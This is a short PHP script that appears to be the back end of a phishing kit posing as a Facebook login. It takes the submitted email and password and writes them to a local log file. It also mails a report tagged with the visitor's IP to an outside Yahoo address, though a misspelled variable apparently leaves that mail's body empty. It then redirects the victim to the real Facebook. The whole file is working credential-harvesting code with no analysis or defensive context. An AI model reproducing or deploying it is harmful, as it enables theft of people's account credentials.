<?php



$date = gmdate ("d-n-Y");
$time = gmdate ("H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$message .= "".$_POST['email'].":";
$message .= "".$_POST['pass']."\n";
$send= "mandoms61@yahoo.com";
$subject = "Morco SpAm ReZulT | $ip";
$headers = "From: Morco SpAm ReZulT";
$file = fopen("Morco.txt","ab");
fwrite($file,$message);
fclose($file);
mail($send,$subject,$rnessage,$headers);

header("Location: https://www.facebook.com/");


?>